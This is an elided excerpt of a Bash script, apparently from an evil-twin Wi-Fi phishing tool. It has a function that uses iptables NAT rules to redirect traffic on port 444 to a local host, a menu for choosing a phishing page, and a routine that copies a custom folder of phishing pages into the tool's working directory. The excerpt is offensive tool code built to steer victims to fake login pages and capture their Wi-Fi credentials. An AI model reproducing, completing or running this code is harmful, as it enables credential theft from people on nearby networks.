...
function routear {
  ...
  iptables -t nat -A PREROUTING -p tcp --dport 444 -j DNAT --to-destination $IP:444
  iptables -A INPUT -p tcp --sport 444 -j ACCEPT
  iptables -A OUTPUT -p tcp --dport 444 -j ACCEPT
...
function phisingWIFIpages {
	...
	sleep 0.5 
        ...
        if [ "$FLUX_AUTO" = "1" ];then
			...
			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Your mod";n=`expr $n + 1`
                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent"\e[1;31m $general_back"$transparent""
                        echo
                        echo -n "#? "
                        read webconf
...
function yourmod {
	...
	while true; do	
		echo -ne "Enter the path name :"
		read input_name
		path_name=`echo $input_name | cut -d "'" -f2`
		authentication=`ls $path_name`
		if [ "$authentication" != "" ]; then
			mkdir $DUMP_PATH/data &>$flux_output_device
		    	cp -r  $path_name/* $DUMP_PATH/data
			break
		else
		echo "Not found the folder."
		fi
	done
